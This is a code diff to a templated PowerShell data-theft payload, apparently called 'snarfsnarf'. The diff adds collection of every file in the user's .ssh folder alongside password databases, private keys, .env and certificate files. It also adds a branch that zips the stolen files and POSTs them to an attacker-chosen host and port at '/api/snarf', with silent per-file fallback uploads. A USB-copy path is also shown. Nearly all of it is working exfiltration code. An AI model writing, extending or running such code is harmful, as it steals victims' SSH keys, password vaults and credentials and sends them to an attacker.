@@ -27,6 +27,10 @@ Add-Files -Paths @(
 {% if targets.sensitive %}
 Add-Files -Paths @("$env:USERPROFILE", "$env:USERPROFILE\Documents") `
     -Extensions @('.kdbx','.pem','.key','.env','.config','.pfx')
+$sshDir = "$env:USERPROFILE\.ssh"
+if (Test-Path $sshDir) {
+    Get-ChildItem $sshDir -File | ForEach-Object { $Collected.Add($_.FullName) }
+}
 {% endif %}
 
 {% if targets.credentials %}
@@ -90,6 +94,35 @@ if ($unique.Count -eq 0) { exit 0 }
 
 {% if output_mode == 'phone_home' %}
 $uri = "http://{{ lhost }}:{{ lport }}/api/snarf{% if catch_token %}?ct={{ catch_token }}{% endif %}"
+{% if zip %}
+$zipPath = "$env:TEMP\snarf_${SnarfHost}_${SnarfStamp}.zip"
+try {
+    Compress-Archive -Path @($unique) -DestinationPath $zipPath -Force -ErrorAction Stop
+    if (Test-Path $zipPath) {
+        $form = @{
+            hostname  = $SnarfHost
+            source    = 'snarfsnarf'
+            timestamp = $SnarfStamp
+            filepath  = $zipPath
+            file      = Get-Item -LiteralPath $zipPath
+        }
+        Invoke-RestMethod -Uri $uri -Method Post -Form $form -ErrorAction Stop
+    }
+} catch {
+    foreach ($file in $unique) {
+        try {
+            $form = @{
+                hostname  = $SnarfHost
+                source    = 'snarfsnarf'
+                timestamp = $SnarfStamp
+                filepath  = $file
+                file      = Get-Item -LiteralPath $file
+            }
+            Invoke-RestMethod -Uri $uri -Method Post -Form $form -ErrorAction Stop
+        } catch {}
+    }
+}
+{% else %}
 foreach ($file in $unique) {
     try {
         $bytes = [System.IO.File]::ReadAllBytes($file)
@@ -103,6 +136,7 @@ foreach ($file in $unique) {
         Invoke-RestMethod -Uri $uri -Method Post -Form $form -ErrorAction Stop
     } catch {}
 }
+{% endif %}
 {% else %}
 # Find removable USB
 $usb = Get-WmiObject Win32_LogicalDisk -ErrorAction SilentlyContinue |
